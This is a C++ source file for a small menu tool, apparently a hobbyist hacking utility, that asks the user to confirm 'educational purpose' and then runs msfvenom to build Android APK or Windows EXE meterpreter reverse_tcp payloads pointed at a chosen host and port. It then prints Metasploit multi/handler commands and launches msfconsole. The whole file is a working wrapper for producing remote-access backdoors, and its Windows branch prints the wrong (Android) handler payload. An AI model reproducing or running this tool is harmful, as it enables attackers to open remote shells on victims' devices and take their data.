#include <iostream>
#include<string.h>
#include <bits/stdc++.h>
#include<conio.h>
#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif
#include <cstdlib>
using namespace std;
int main(){

char inp ,Y,y;

int a;
string filename,host,port;

   textcolor(9);
    cout<<" ____  _             _ _           _ "<<endl;
    cout<<"/ ___|| |_ _   _  __| | |__   ___ (_)"<<endl;
    cout<<"\\___ \\| __| | | |/ _` | '_ \\ / _ \\| |"<<endl;
    cout<<" ___) | |_| |_| | (_| | |_) | (_) | |"<<endl;
    cout<<"|____/ \\__|\\__,_|\\__,_|_.__/ \\___/|_|"<<endl<<endl;
   textcolor(12);
cout<<"Are you gonna use this for educational purpose?(Y/N): ";
textcolor(2);
cin>>inp;
if(inp=='Y' || inp=='y'){

    cout<<"Welcome......."<<endl<<endl;

}
else{

    cout<<"Thanks for coming.........";

    return 0;
}
system("clear");
textcolor(6);

cout<<"[1] mobile"<<endl;
cout<<"[2] Windows"<<endl<<endl;

textcolor(8);

cout<<"press the no-> ";

cin>>a;

if (a==1)

{    textcolor(7);
    cout<<"enter your host(ip)->";
    cin>>host;
    textcolor(12);
    cout<<"=>"<<host<<endl;
    textcolor(7);

    cout<<"Enter your port->";
    cin>>port;
    textcolor(12);
    cout<<"=>"<<port<<endl;
    textcolor(7);

cout<<"Enter your filename->";
    cin>>filename;
    textcolor(12);
    cout<<"=>"<<filename<<endl;
    textcolor(7);
    ostringstream os;
    os << "msfvenom  -p android/meterpreter/reverse_tcp LHOST="<<host<<" LPORT="<<port<<" R>"<<filename<<".apk";
    system(os.str().c_str());
    textcolor(9);
    cout<<"TYPE THIS COMMANDS IN MSFCONSOLE"<<endl;
    cout<<">>use exploit/multi/handler"<<endl;
    cout<<">>set payload android/meterpreter/reverse_tcp"<<endl;
    cout<<">>set lhost <ur host(ip)>"<<endl;
    cout<<">>set lport <ur port>"<<endl;
    cout<<">>run"<<endl;
    cout<<"msfconsole is starting in..."<<endl;
    cout<<"3"<<endl;
    sleep(5);
    cout<<"2"<<endl;
    sleep(6);
    cout<<"1"<<endl;
    system("msfconsole ");
    textcolor(7);

}
if(a==2){
     textcolor(7);
    cout<<"enter your host(ip)->";
    cin>>host;
    textcolor(12);
    cout<<"=>"<<host<<endl;
    textcolor(7);

    cout<<"Enter your port->";
    cin>>port;
    textcolor(12);
    cout<<"=>"<<port<<endl;
    textcolor(7);

cout<<"Enter your filename->";
    cin>>filename;
    textcolor(12);
    cout<<"=>"<<filename<<endl;
    textcolor(7);

    ostringstream os;
    os<< "msfvenom -p windows/meterpreter/reverse_tcp lhost="<<host<<" lport="<<port<<" -f exe -o "<<filename<<".exe";
    system(os.str().c_str());
   textcolor(9);
    cout<<"TYPE THIS COMMANDS IN MSFCONSOLE"<<endl;
    cout<<">>use exploit/multi/handler"<<endl;
    cout<<">>set payload android/meterpreter/reverse_tcp"<<endl;
    cout<<">>set lhost <ur host(ip)>"<<endl;
    cout<<">>set lport <ur port>"<<endl;
    cout<<">>run"<<endl;
    cout<<"msfconsole is starting in..."<<endl;
    cout<<"3"<<endl;
    sleep(5);
    cout<<"2"<<endl;
    sleep(6);
    cout<<"1"<<endl;
    system("msfconsole ");
   
    textcolor(7);
}
else{

    return 0;

}





return 0;

}